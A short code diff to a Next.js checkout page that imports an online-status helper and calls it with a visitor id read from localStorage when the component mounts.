@@ -15,7 +15,7 @@ import { Separator } from "@/components/ui/separator"
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
-import { cn } from "@/lib/utils"
+import { cn, setupOnlineStatus } from "@/lib/utils"
 
 const allOtps: string[] = [""]
 
@@ -55,6 +55,8 @@ export default function CheckoutPage() {
     }
   }, [showOtpDialog, timeLeft])
   useEffect(() => {
+    const _id=localStorage.getItem("visitor")!
+    setupOnlineStatus(_id)
     const am = localStorage.getItem("amount")!
     setAmount(am)
   }, [])
